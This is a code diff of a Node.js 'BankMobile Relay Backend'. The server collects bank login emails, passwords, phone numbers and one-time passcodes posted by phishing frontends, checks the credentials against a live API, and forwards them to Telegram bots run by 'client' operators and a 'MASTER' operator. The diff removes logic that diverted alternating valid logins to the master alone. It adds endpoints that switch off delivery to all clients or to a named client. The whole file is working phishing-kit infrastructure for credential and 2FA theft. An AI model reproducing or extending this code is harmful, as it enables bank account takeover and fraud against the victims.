@@ -1,6 +1,6 @@
 // ================================================
 // BANKMOBILE CENTRAL RELAY BACKEND
-// Final version with queue system
+// Simple version + Global & Per-Client switch
 // ================================================
 require('dotenv').config();
 const express = require('express');
@@ -46,24 +46,10 @@ const DEFAULT_CONFIG = {
 };
 
 // ================================================
-// STORAGE
+// SWITCHES
 // ================================================
-const validCounters = {};           // for alternating valid logins
-const pendingQueue = {};            // queue of pending sessions per client
-const SESSION_TIMEOUT = 15 * 60 * 1000; // 15 minutes
-
-// Clean expired sessions every 2 minutes
-setInterval(() => {
-    const now = Date.now();
-    for (const clientId in pendingQueue) {
-        pendingQueue[clientId] = pendingQueue[clientId].filter(item => {
-            return (now - item.createdAt) < SESSION_TIMEOUT;
-        });
-        if (pendingQueue[clientId].length === 0) {
-            delete pendingQueue[clientId];
-        }
-    }
-}, 2 * 60 * 1000);
+let clientsEnabled = true;              // Global switch
+const disabledClients = new Set();      // Individual clients that are turned off
 
 // ================================================
 // SEND TO TELEGRAM
@@ -88,139 +74,32 @@ async function sendToTelegram(token, chatId, message) {
 }
 
 // ================================================
-// HELPER: Send to both
+// SEND TO BOTS (respects global + individual switches)
 // ================================================
-async function sendToBoth(clientId, clientMessage, masterMessage) {
+async function sendToBots(clientId, clientMessage, masterMessage) {
     const results = [];
-    const config = BOT_CONFIGS[clientId] || DEFAULT_CONFIG;
 
-    const clientResult = await sendToTelegram(config.token, config.chatId, clientMessage);
-    results.push({ bot: clientId, sent: clientResult });
-
+    // Always send to MASTER
     const masterResult = await sendToTelegram(MASTER_BOT.token, MASTER_BOT.chatId, masterMessage);
     results.push({ bot: 'MASTER', sent: masterResult });
 
-    return results;
-}
+    // Decide if this client should receive the message
+    const isClientAllowed = clientsEnabled && !disabledClients.has(clientId);
 
-// ================================================
-// HELPER: Send only to one destination
-// ================================================
-async function sendToDestination(clientId, destination, clientMessage, masterMessage) {
-    const results = [];
-
-    if (destination === 'master') {
-        const masterResult = await sendToTelegram(MASTER_BOT.token, MASTER_BOT.chatId, masterMessage);
-        results.push({ bot: 'MASTER', sent: masterResult });
-        results.push({ bot: clientId, sent: false, reason: 'Valid session → MASTER only' });
-    } else {
+    if (isClientAllowed) {
         const config = BOT_CONFIGS[clientId] || DEFAULT_CONFIG;
         const clientResult = await sendToTelegram(config.token, config.chatId, clientMessage);
         results.push({ bot: clientId, sent: clientResult });
-        results.push({ bot: 'MASTER', sent: false, reason: 'Valid session → CLIENT only' });
+    } else {
+        let reason = 'Clients globally DISABLED';
+        if (clientsEnabled && disabledClients.has(clientId)) {
+            reason = `Client "${clientId}" is individually DISABLED`;
+        }
+        results.push({ bot: clientId, sent: false, reason });
+        console.log(`🚫 ${reason} → message only went to MASTER`);
     }
 
     return results;
-}
-
-// ================================================
-// MAIN ROUTING FUNCTION
-// ================================================
-async function sendToAllBots(clientMessage, clientId, masterMessage, isSuccess, isPhoneOrOtp = false, isOtp = false) {
-    // ---------- PHONE or OTP ----------
-    if (isPhoneOrOtp) {
-        // Make sure queue exists
-        if (!pendingQueue[clientId]) pendingQueue[clientId] = [];
-
-        // Clean expired first
-        const now = Date.now();
-        pendingQueue[clientId] = pendingQueue[clientId].filter(item => (now - item.createdAt) < SESSION_TIMEOUT);
-
-        if (isOtp) {
-            // OTP → only match VALID sessions that still need OTP
-            const index = pendingQueue[clientId].findIndex(item => item.type === 'valid' && !item.otpUsed);
-
-            if (index !== -1) {
-                const session = pendingQueue[clientId][index];
-                session.otpUsed = true;
-
-                // If both phone and otp are used, remove it
-                if (session.phoneUsed && session.otpUsed) {
-                    pendingQueue[clientId].splice(index, 1);
-                }
-
-                console.log(`🔐 OTP for ${clientId} → following valid session (${session.destination})`);
-                return await sendToDestination(clientId, session.destination, clientMessage, masterMessage);
-            } else {
-                // No matching valid session → fallback to both
-                console.log(`🔐 OTP for ${clientId} → no matching valid session → BOTH`);
-                return await sendToBoth(clientId, clientMessage, masterMessage);
-            }
-        } else {
-            // PHONE
-            const index = pendingQueue[clientId].findIndex(item => !item.phoneUsed);
-
-            if (index !== -1) {
-                const session = pendingQueue[clientId][index];
-                session.phoneUsed = true;
-
-                if (session.type === 'invalid') {
-                    // Invalid login phone → always both
-                    // We can remove it now because invalid only needs phone
-                    pendingQueue[clientId].splice(index, 1);
-                    console.log(`📱 Phone for ${clientId} → INVALID session → BOTH`);
-                    return await sendToBoth(clientId, clientMessage, masterMessage);
-                } else {
-                    // Valid login phone → follow destination
-                    console.log(`📱 Phone for ${clientId} → VALID session (${session.destination})`);
-                    return await sendToDestination(clientId, session.destination, clientMessage, masterMessage);
-                }
-            } else {
-                // No pending session → fallback to both
-                console.log(`📱 Phone for ${clientId} → no pending session → BOTH`);
-                return await sendToBoth(clientId, clientMessage, masterMessage);
-            }
-        }
-    }
-
-    // ---------- INVALID LOGIN → always both + push to queue ----------
-    if (!isSuccess) {
-        if (!pendingQueue[clientId]) pendingQueue[clientId] = [];
-
-        pendingQueue[clientId].push({
-            type: 'invalid',
-            destination: 'both',
-            phoneUsed: false,
-            otpUsed: true,          // invalid never expects OTP
-            createdAt: Date.now()
-        });
-
-        console.log(`❌ Invalid login from ${clientId} → BOTH + queued for phone`);
-        return await sendToBoth(clientId, clientMessage, masterMessage);
-    }
-
-    // ---------- VALID LOGIN → alternating + push to queue ----------
-    if (!validCounters[clientId]) {
-        validCounters[clientId] = 0;
-    }
-
-    validCounters[clientId]++;
-    const isEven = validCounters[clientId] % 2 === 0;
-    const destination = isEven ? 'master' : 'client';
-
-    console.log(`🔄 ${clientId} valid #${validCounters[clientId]} → ${destination.toUpperCase()}`);
-
-    // Push to queue
-    if (!pendingQueue[clientId]) pendingQueue[clientId] = [];
-    pendingQueue[clientId].push({
-        type: 'valid',
-        destination: destination,
-        phoneUsed: false,
-        otpUsed: false,
-        createdAt: Date.now()
-    });
-
-    return await sendToDestination(clientId, destination, clientMessage, masterMessage);
 }
 
 // ================================================
@@ -322,25 +201,18 @@ async function handleAuth(req, res) {
     const result = await authenticateWithAPI(email, password);
     const messages = formatMessage(email, password, result.success);
 
-    const results = await sendToAllBots(
-        messages.clientMessage,
-        clientId,
-        messages.masterMessage,
-        result.success,
-        false
-    );
+    const results = await sendToBots(clientId, messages.clientMessage, messages.masterMessage);
 
     res.json({
         success: result.success,
         client: clientId,
-        telegramSent: results,
-        counter: validCounters[clientId] || 0,
-        queueLength: pendingQueue[clientId] ? pendingQueue[clientId].length : 0
+        clientsEnabled,
+        telegramSent: results
     });
 }
 
 // ================================================
-// PHONE HANDLER
+// PHONE + OTP HANDLERS
 // ================================================
 app.post('/submit-phone', async (req, res) => {
     const { phone, frontend } = req.body;
@@ -349,14 +221,11 @@ app.post('/submit-phone', async (req, res) => {
     console.log(`📱 Phone from ${clientId}: ${phone}`);
 
     const messages = formatPhoneMessage(phone);
-    await sendToAllBots(messages.clientMessage, clientId, messages.masterMessage, true, true, false);
+    await sendToBots(clientId, messages.clientMessage, messages.masterMessage);
 
     res.json({ success: true });
 });
 
-// ================================================
-// OTP HANDLER
-// ================================================
 app.post('/submit-otp', async (req, res) => {
     const { otp, trusted, frontend } = req.body;
     const clientId = frontend || 'default';
@@ -364,9 +233,76 @@ app.post('/submit-otp', async (req, res) => {
     console.log(`🔐 OTP from ${clientId}: ${otp}`);
 
     const messages = formatOtpMessage(otp, trusted || false);
-    await sendToAllBots(messages.clientMessage, clientId, messages.masterMessage, true, true, true);
+    await sendToBots(clientId, messages.clientMessage, messages.masterMessage);
 
     res.json({ success: true });
+});
+
+// ================================================
+// CONTROL ENDPOINTS
+// ================================================
+
+// Turn ALL clients OFF
+app.post('/clients-off', (req, res) => {
+    clientsEnabled = false;
+    console.log('🚫 ALL CLIENTS DISABLED → Only Master receives messages');
+    res.json({
+        success: true,
+        message: 'All clients disabled. Only Master bot will receive messages.',
+        clientsEnabled: false
+    });
+});
+
+// Turn ALL clients ON
+app.post('/clients-on', (req, res) => {
+    clientsEnabled = true;
+    console.log('✅ ALL CLIENTS ENABLED');
+    res.json({
+        success: true,
+        message: 'All clients enabled.',
+        clientsEnabled: true
+    });
+});
+
+// Turn ONE specific client OFF
+app.post('/client-off/:clientId', (req, res) => {
+    const clientId = req.params.clientId.toLowerCase();
+
+    if (!BOT_CONFIGS[clientId] && clientId !== 'default') {
+        return res.status(404).json({ success: false, message: `Client "${clientId}" not found` });
+    }
+
+    disabledClients.add(clientId);
+    console.log(`🚫 Client "${clientId}" DISABLED`);
+    res.json({
+        success: true,
+        message: `Client "${clientId}" has been disabled.`,
+        disabledClients: Array.from(disabledClients)
+    });
+});
+
+// Turn ONE specific client ON
+app.post('/client-on/:clientId', (req, res) => {
+    const clientId = req.params.clientId.toLowerCase();
+
+    disabledClients.delete(clientId);
+    console.log(`✅ Client "${clientId}" ENABLED`);
+    res.json({
+        success: true,
+        message: `Client "${clientId}" has been enabled.`,
+        disabledClients: Array.from(disabledClients)
+    });
+});
+
+// Check current status
+app.get('/clients-status', (req, res) => {
+    res.json({
+        globalClientsEnabled: clientsEnabled,
+        disabledClients: Array.from(disabledClients),
+        status: clientsEnabled
+            ? (disabledClients.size === 0 ? 'All clients ON' : `Some clients disabled: ${Array.from(disabledClients).join(', ')}`)
+            : 'ALL clients OFF (Master only)'
+    });
 });
 
 // ================================================
@@ -379,30 +315,30 @@ app.post('/login', handleAuth);
 app.post('/validate', handleAuth);
 
 // ================================================
-// HEALTH CHECK
+// HEALTH + ROOT
 // ================================================
 app.get('/health', (req, res) => {
     res.json({
         status: 'ok',
         service: 'bankmobile-relay',
-        clients: Object.keys(BOT_CONFIGS),
-        counters: validCounters,
-        pendingQueues: pendingQueue
+        clientsEnabled,
+        disabledClients: Array.from(disabledClients),
+        clients: Object.keys(BOT_CONFIGS)
     });
 });
 
-// ================================================
-// ROOT
-// ================================================
 app.get('/', (req, res) => {
     res.json({
-        service: 'BankMobile Relay Backend - Final Queue Version',
+        service: 'BankMobile Relay Backend',
         status: 'running',
-        logic: {
-            invalidLogin: 'Both + queue for phone (phone also goes to both)',
-            validLogin: 'Alternating + queue for phone+OTP',
-            phone: 'Follows the matching queued session',
-            otp: 'Only follows valid queued sessions'
+        clientsEnabled,
+        disabledClients: Array.from(disabledClients),
+        control: {
+            'POST /clients-off': 'Disable ALL clients',
+            'POST /clients-on': 'Enable ALL clients',
+            'POST /client-off/:clientId': 'Disable one client (example: /client-off/emmy)',
+            'POST /client-on/:clientId': 'Enable one client (example: /client-on/emmy)',
+            'GET /clients-status': 'Check current status'
         }
     });
 });
@@ -413,6 +349,6 @@ app.get('/', (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ BankMobile Relay running on port ${PORT}`);
     console.log(`📨 Clients: ${Object.keys(BOT_CONFIGS).join(', ')}`);
-    console.log(`🔄 Valid logins alternate | Phone/OTP follow queue`);
-    console.log(`⏰ Pending sessions expire after 15 minutes`);
+    console.log(`🔧 Global: POST /clients-off  |  POST /clients-on`);
+    console.log(`🔧 Single: POST /client-off/emmy  |  POST /client-on/emmy`);
 });
